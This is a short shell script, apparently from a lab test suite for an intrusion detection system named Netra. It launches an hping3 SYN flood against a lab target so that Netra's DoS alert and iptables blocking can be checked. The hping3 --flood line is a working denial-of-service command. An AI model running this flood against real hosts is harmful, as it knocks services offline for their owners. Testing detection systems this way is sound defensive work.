#!/bin/sh
# SYN flood with hping3. Sends TCP SYN packets as fast as possible, spoofing
# nothing (the real source is used so Netra can block it).
# Netra should raise a DoS alert (signature rule: more than 100 SYN/s from one
# source), then block the source with a timed iptables rule.
#
# Usage: sh synflood.sh [victim_ip] [port] [duration_seconds]
set -u

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"

TARGET="${1:-$VICTIM_DEFAULT}"
PORT="${2:-80}"
DURATION="${3:-20}"
require_lab_target "$TARGET"

banner "SYN flood ->  $TARGET:$PORT   (hping3 --flood, ${DURATION}s)"
echo "Expected Netra alert: DoS, then the source is blocked."
echo

# -S SYN flag, --flood send as fast as possible (no replies shown). timeout
# stops it after DURATION and hping3 prints its summary on the way out.
timeout "$DURATION" hping3 -S -p "$PORT" --flood "$TARGET" || true

echo
echo "SYN flood finished after ${DURATION}s."
